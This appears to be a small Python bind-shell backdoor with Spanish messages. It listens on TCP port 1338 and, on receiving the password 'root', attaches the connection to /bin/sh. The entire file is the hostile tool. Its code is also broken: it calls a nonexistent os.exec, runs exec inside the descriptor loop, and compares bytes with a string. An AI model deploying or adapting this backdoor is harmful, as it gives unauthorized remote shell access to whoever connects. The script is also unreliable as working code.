#!/usr/bin/env python
#--*-- coding: utf-8 --*--
import socket, os, code 

host = ''
port = 1338
palabra = ""

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host, port))
s.listen(1)

cliente, direccion = s.accept()
print(direccion)
print (cliente.getpeername())
cliente.send(b"Hola eni\n")
palabra = cliente.recv(1024)

print(palabra)
while 1:
    if palabra == "root\n":
        print ("q en root")
        for f in range(3):
            os.dup2(cliente.fileno(), f)
            os.exec("/bin/sh", "/bin/sh")
            code.interact()
    else:
        print("Salimos")
        break 
cliente.close()
s.close()